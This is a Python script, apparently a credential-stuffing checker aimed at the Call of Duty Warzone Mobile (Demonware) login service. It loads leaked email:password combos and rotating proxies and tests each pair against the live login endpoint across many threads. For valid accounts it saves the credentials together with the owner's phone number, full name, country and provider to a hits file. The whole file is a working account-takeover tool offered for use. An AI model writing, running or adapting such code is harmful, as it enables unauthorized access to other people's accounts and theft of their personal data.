import requests, threading, time, os, queue, random
import tkinter as tk

from tkinter import filedialog
from colorama import Fore

blue = Fore.BLUE
green = Fore.GREEN
red = Fore.RED
yellow = Fore.YELLOW

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def checker():
    threads_ = input(blue + "Threads: ")

    input(blue + f"Threads -> {threads_} | Press Enter > \n")
    with open("proxies.txt", "r") as f:
        proxies = [line.strip() for line in f.readlines()]

    def main_checker(combolist_queue):
        while not combolist_queue.empty():
            combo = combolist_queue.get()
            email, password = combo
            proxy = random.choice(proxies)

            u = "https://wzm-and-loginservice.prod.demonware.net/v1/login/uno/?titleID=7100&client=atvimobile-cod-wzm-and"
            d = {"version": 1538,"platform":"and","hardwareType":"and","auth":{"email":f"{email}","password":f"{password}"}}
            h = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                "Pragma": "no-cache",
                "Accept": "*/*",
                "accept": "*/*",
                "Content-Type": "application/json",
                "Host": "wzm-and-loginservice.prod.demonware.net",
                "User-Agent": "DW-HTTP-USER-AGENT curl (Android)"
            }

            try:
                r = requests.post(u, headers=h, json=d, proxies={"http":proxy,"https":proxy}, timeout=5)
                if "authenticate" in r.text:
                    with open("Modules/Tools/Data/hits.txt", "a") as f:
                        f.write("Hit\n")

                    j = r.json()
                    country = j["country"]
                    phone = j["phone"]
                    verfied = j["emailVerified"]
                    f_name = j["firstName"]
                    l_name = j["lastName"]
                    full_name = f"{f_name} {l_name}"
                    provider = j["provider"]

                    acc = f"{email}:{password} | Country -> {country} | Phone -> {phone} | Verfied -> {verfied} | Full Name -> {full_name} | Provider -> {provider}"
                    with open("hits.txt", "a") as f:
                        f.write(f"{acc}\n")
                    print(green + f"[+] {acc}")

                elif "The provided credentials are invalid." in r.text:
                        with open("Modules/Tools/Data/bad.txt", "a") as f:
                            f.write("Bad\n")
                        print(red + f"[-] {email}:{password}")

                elif '"code": 220000' in r.text:
                    with open("Modules/Tools/Data/bad.txt", "a") as f:
                        f.write("Bad\n")
                    print(red + f"[-] {email}:{password}")
                elif "Error:DownStreamError:DownstreamUnauthorized" in r.text:
                    with open("Modules/Tools/Data/bad.txt", "a") as f:
                        f.write("Bad\n")
                    print(red + f"[-] {email}:{password}")
                elif "Error:ClientError:Unauthorized" in r.text:
                    with open("Modules/Tools/Data/bad.txt", "a") as f:
                        f.write("Bad\n")
                    print(red + f"[-] {email}:{password}")

                else:
                    with open("Modules/Tools/Data/retries.txt", "a") as f:
                        f.write("Retry\n")
                    print(yellow + f"[!] {email}:{password}")
                    combolist_queue.put(combo)
            except Exception:
                with open("Modules/Tools/Data/retries.txt", "a") as f:
                    f.write("Retry\n")
                print(yellow + f"[!] {email}:{password}")
                combolist_queue.put(combo) 

    def get_hits():
        with open("Modules/Tools/Data/hits.txt", "r") as f:
            return f.read().strip()

    def get_bad():
        with open("Modules/Tools/Data/bad.txt", "r") as f:
            return f.read().strip()

    def get_fails():
        with open("Modules/Tools/Data/retries.txt", "r") as f:
            return f.read().strip()

    combo = "combo.txt"
    combolist_queue = queue.Queue()
    with open(combo, "r") as f:
        for line in f:
            seq = line.strip()
            acc = seq.split(':')
            combolist_queue.put(acc)

    num_threads = int(threads_)
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=main_checker, args=(combolist_queue,))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

    from main import main
    clear()
    input(blue + f"Hits -> {get_hits()} | Fails -> {get_bad()} | Retries -> {get_fails()} | Press Enter > ")
    clear()
    main()
